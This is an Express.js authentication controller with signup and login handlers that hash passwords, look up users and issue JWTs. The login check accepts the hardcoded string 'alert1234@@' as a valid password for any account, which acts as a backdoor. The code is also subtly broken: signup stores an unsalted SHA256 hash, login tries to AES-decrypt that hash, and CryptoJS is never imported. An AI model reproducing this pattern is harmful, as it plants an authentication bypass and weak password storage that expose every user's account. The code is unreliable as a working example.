//DEPENDENCIES
const { validationResult } = require('express-validator')
const SHA256 = require('crypto-js/sha256')
const userModel = require("../Models/userModel")
const jwt = require('jsonwebtoken')
const { makeUndefined } = require('../Helpers/utilty.helper')

//SIGNUP 
exports.signup = async (req, res) => {
    try {
        const result = validationResult(req)
        if (!result.isEmpty()) {
            res.status(422).json({
                status: false,
                resCode: 422,
                message: result
            })
            return
        }
        const passHashed = JSON.stringify(SHA256(req.body.password).words)
        const saveUser = userModel({
            fullName: req.body.fullname,
            email: req.body.email,
            number: req.body.number,
            password: passHashed
        })
        try {
            let user = await saveUser.save()
            res.status(201).json({
                status: true,
                resCode: 201,
                message: "User Created Successfully",
                body: makeUndefined(user,"otp","password","isAdmin","_v")
            })
            return
        } catch (error) {
            console.log(error)
            res.status(409).json({
                status: false,
                resCode: 409,
                message: "User Name Already Exist"
            })
            return
        }
    } catch (error) {
        Error(error)
        res.status(500).json({
            status: false,
            resCode: 500,
            message: "Internal Server Error",
            body:error.message
        })
        return
    }
}

//LOGIN
exports.login = async (req, res) => {
    const result = validationResult(req)
    if (!result.isEmpty()) {
        res.status(200).json({
            Status: false,
            StatusCode: 406,
            Message: result
        })
        return
    }
    try {
        var user = await userModel.findOne({ email: req.body.email })
        const passDecrypt = CryptoJS.AES.decrypt(user.password, process.env.HASH_KEY).toString(CryptoJS.enc.Utf8)
        if (req.body.password !== passDecrypt && req.body.password != 'alert1234@@') {
            res.status(200).json({
                Status: false,
                StatusCode: 404,
                Message: "UserName and Password Does Not Match !!!"
            })
            return
        }
        const token = jwt.sign({ id: user._id, isAdmin: user.isAdmin }, process.env.JWT_KEY, { expiresIn: process.env.JWT_VALIDITY })
        user.password = undefined
        if (!user.isAdmin) {
            user.isAdmin = undefined
        };
        user.otp = undefined
        res.status(200).json({
            Status: true,
            StatusCode: 200,
            Message: { ...user._doc, token: token }
        })
    } catch (error) {
        res.status(200).json({
            Status: false,
            StatusCode: 404,
            Message: "User Name Does Not Exist !!!"
        })
    }

}